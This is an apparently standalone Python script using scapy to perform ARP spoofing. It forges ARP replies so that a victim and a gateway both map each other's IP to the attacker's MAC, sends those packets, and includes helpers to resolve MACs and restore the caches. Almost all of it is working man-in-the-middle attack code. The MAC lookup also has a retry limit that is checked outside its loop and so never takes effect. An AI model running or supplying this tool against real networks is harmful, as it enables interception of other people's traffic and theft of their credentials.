
from scapy.all import * 

interface = conf.iface
attackerMac= get_if_hwaddr(interface)

def spoof_arp(target_mac: str, spoofed_ip: str, target_ip: str, spoofed_mac: str ) -> tuple:
    """This function creates the spoofed ARP packets."""
    packetToVictim = scapy.all.Ether(dst=target_mac) / scapy.all.ARP(op=2,psrc=spoofed_ip,pdst=target_ip,hwsrc=attackerMac,hwdst=target_mac) 
    packetToGateway = scapy.all.Ether(dst=spoofed_mac) / scapy.all.ARP(op=2,psrc=target_ip,pdst=spoofed_ip,hwsrc=attackerMac,hwdst=spoofed_mac) 

    spoofed_arp = (packetToVictim,packetToGateway)
    return spoofed_arp

def build_legitime_arp(target_mac: str, target_ip: str, real_src_mac: str, real_src_ip: str):
    """This function creates the real ARP packet so the ARP cache can be restored"""
    print("[!] Restaurando cache ARP de:",target_ip)
    packet = scapy.all.Ether(dst=target_mac) / scapy.all.ARP(op=2,psrc=real_src_ip,pdst=target_ip,hwsrc=real_src_mac,hwdst=target_mac)
    return packet

def get_mac(ip: str, t: int):
    """resolves MAC from the target and spoofed IP in 't' attempts"""
    mac = None
    intento = 0
    while mac is None:
        mac = scapy.all.getmacbyip(ip)
        intento +=1
    if intento > t:
        print("Resolución de MAC imposible tras:",intento,"intentos")
        exit() 
    return mac

def send_arp(packets_to_send: tuple):
    """This functions tries sending the spoofed arp packets. A spoofed arp packet 
    is a tuple of two elements:
    1) the packet sent to target 
    2) the packet sent to the device we want to impersonate."""
    sendp(packets_to_send[0], iface=interface, verbose = False)
    sendp(packets_to_send[1], iface=interface, verbose = False)